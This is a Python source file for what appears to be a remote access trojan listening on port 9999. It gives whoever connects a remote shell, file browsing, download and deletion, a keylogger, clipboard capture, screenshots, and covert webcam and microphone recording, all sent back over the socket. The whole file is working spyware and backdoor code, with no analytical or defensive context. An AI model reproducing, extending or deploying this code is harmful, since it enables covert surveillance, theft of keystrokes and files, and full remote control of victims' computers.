import socket
import os
import platform
from PIL import ImageGrab
from subprocess import Popen, PIPE
import psutil
from pynput import keyboard
import threading
import time
import pyperclip
import cv2
import sounddevice as sd
import wave

def start_keylogger(client_socket):
    log = []
    stop_flag = threading.Event()

    def on_press(key):
        try:
            log.append(key.char)
        except AttributeError:
            log.append(f"[{key}]")

    def keylogger_thread():
        with keyboard.Listener(on_press=on_press) as listener:
            while not stop_flag.is_set():
                pass
            listener.stop()

    # Запускаємо кейлогер у фоновому потоці
    thread = threading.Thread(target=keylogger_thread)
    thread.start()
    client_socket.sendall(b"Keylogger started. Type 'STOP_KEYLOGGER' to stop.")

    while not stop_flag.is_set():
        try:
            command = client_socket.recv(1024).decode()
            if command.strip().upper() == "STOP_KEYLOGGER":
                stop_flag.set()
        except socket.error:
            break

    thread.join()
    key_log = ''.join(log)
    if not key_log:
        key_log = "No keys were pressed."
    client_socket.sendall(key_log.encode())

def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("screenshot.png")
    return "screenshot.png"

def get_system_info():
    return f"OS: {platform.system()} {platform.release()}, Processor: {platform.processor()}"

def send_file(client_socket, file_path):
    file_size = os.path.getsize(file_path)
    client_socket.sendall(f"{file_size}".encode())
    client_socket.recv(1024)
    # Відправка самого файлу
    with open(file_path, "rb") as file:
        while chunk := file.read(1024):
            client_socket.sendall(chunk)

def execute_command(command):
    try:
        process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, text=True)
        stdout, stderr = process.communicate()
        if stdout:
            return stdout
        if stderr:
            return stderr
        return "Command executed successfully with no output."
    except Exception as e:
        return str(e)

def list_directory(path):
    try:
        items = os.listdir(path)
        result = []
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                result.append(f"[DIR] {item}")
            else:
                result.append(f"[FILE] {item}")
        return "\n".join(result)
    except Exception as e:
        return str(e)

def handle_file_operation(client_socket, operation, current_path):
    try:
        if operation == "4":
            new_path = client_socket.recv(1024).decode()
            if os.path.isdir(new_path):
                current_path = new_path
                response = list_directory(current_path)
            else:
                response = f"{new_path} is not a valid directory."
            client_socket.sendall(response.encode())
        elif operation == "5":
            file_name = client_socket.recv(1024).decode()
            file_path = os.path.join(current_path, file_name)
            if os.path.isfile(file_path):
                send_file(client_socket, file_path)
            else:
                client_socket.sendall(b"File not found.")
        elif operation == "6":
            file_name = client_socket.recv(1024).decode()
            file_path = os.path.join(current_path, file_name)
            if os.path.exists(file_path):
                os.remove(file_path)
                client_socket.sendall(b"File deleted.")
            else:
                client_socket.sendall(b"File not found.")
        else:
            lient_socket.sendall(b"Unsupported operation.")
    except Exception as e:
        client_socket.sendall(str(e).encode())
    return current_path

def search_file(file_name):
    root_path = "/" if platform.system() == "Linux" else "C:\\"
    found_files = []
    for root, dirs, files in os.walk(root_path):
        try:
            if file_name in files:
                found_files.append(os.path.join(root, file_name))
        except PermissionError:
            # Пропускаємо каталоги без доступу
            continue
    return "\n".join(found_files) if found_files else f"File '{file_name}' not found."

def get_running_processes():
    try:
        processes = []
        for proc in psutil.process_iter(attrs=['pid', 'name', 'username']):
            try:
                info = proc.info
                processes.append(f"PID: {info['pid']}, Name: {info['name']}, User: {info['username']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        return "\n".join(processes) if processes else "No processes found."
    except Exception as e:
        return str(e)

def get_clipboard_content():
    try:
        content = pyperclip.paste()
        return content if content else "Clipboard is empty."
    except Exception as e:
        return str(e)

def record_video(duration, file_name="output_video.avi"):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Could not open the camera")
        
        # Отримуємо роздільну здатність відео з камери
        frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # Ініціалізуємо відеозапис
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(file_name, fourcc, 20.0, (frame_width, frame_height))
        
        start_time = time.time()
        while int(time.time() - start_time) < duration:
            ret, frame = cap.read()
            if not ret:
                print("Error: Failed to capture frame.")
                break
            out.write(frame)

            cv2.imshow('Recording...', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        cap.release()
        out.release()
        cv2.destroyAllWindows()
        return file_name
    except Exception as e:
        return str(e)

def record_audio(duration, file_name="output_audio.wav"):
    try:
        sample_rate = 44100  # Частота дискретизації
        channels = 2  # Стерео

        recording = sd.rec(int(sample_rate * duration), samplerate=sample_rate, channels=channels, dtype='int16')
        sd.wait()

        with wave.open(file_name, 'wb') as wf:
            wf.setnchannels(channels)
            wf.setsampwidth(2)
            wf.setframerate(sample_rate)
            wf.writeframes(recording.tobytes())

        return file_name
    except Exception as e:
        return str(e)

def handle_client(client_socket):
    current_path = os.getcwd()  # Стартовий каталог
    while True:
        command = client_socket.recv(1024).decode().strip()
        if not command:
            continue
        elif command == "1":
            screenshot_path = take_screenshot()
            send_file(client_socket, screenshot_path)
            os.remove(screenshot_path)
            # print("[*] Screenshot sent to client")
        elif command == "2":
            info = get_system_info()
            client_socket.sendall(info.encode())
            # print("[*] System info sent to client")
        elif command == "7":
            # print("[*] CMD ready to work")
            client_socket.sendall(b"Entering interactive shell mode")
            while True:
                cmd = client_socket.recv(1024).decode().strip()
                if cmd.lower() == "exit":
                    client_socket.sendall(b"Exiting interactive shell mode")
                    break
                result = execute_command(cmd)
                client_socket.sendall(result.encode())
        elif command == "3":
            response = list_directory(current_path)
            client_socket.sendall(response.encode())
        elif command in ["4", "5", "6"]:
            current_path = handle_file_operation(client_socket, command, current_path)
        elif command == "8":
            file_name = client_socket.recv(1024).decode()
            result = search_file(file_name)
            client_socket.sendall(result.encode())
        elif command == "9":
            processes_info = get_running_processes()
            client_socket.sendall(processes_info.encode())
        elif command == "10":
            start_keylogger(client_socket)
        elif command == "11":
            # print("[*] Client disconnected")
            break
        elif command == "12":
            clipboard_content = get_clipboard_content()
            client_socket.sendall(clipboard_content.encode())
        elif command == "13":
            duration = int(client_socket.recv(1024).decode())
            video_file = record_video(duration)
            if os.path.isfile(video_file):
                send_file(client_socket, video_file)
                os.remove(video_file)  # Видаляємо файл після відправки
            else:
                client_socket.sendall(b"Error recording video.")
        elif command == "14":  # Запис аудіо
            duration = int(client_socket.recv(1024).decode())  # Отримуємо тривалість
            audio_file = record_audio(duration)
            if os.path.isfile(audio_file):
                send_file(client_socket, audio_file)
                os.remove(audio_file)
            else:
                client_socket.sendall(b"Error recording audio.")
        else:
            client_socket.sendall(f"Unknown command: {command}".encode())
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    # print("[*] Server listening on port 9999")
    while True:
        client_socket, addr = server.accept()
        # print(f"[*] Accepted connection from {addr}")
        handle_client(client_socket)

if __name__ == "__main__":
    main()
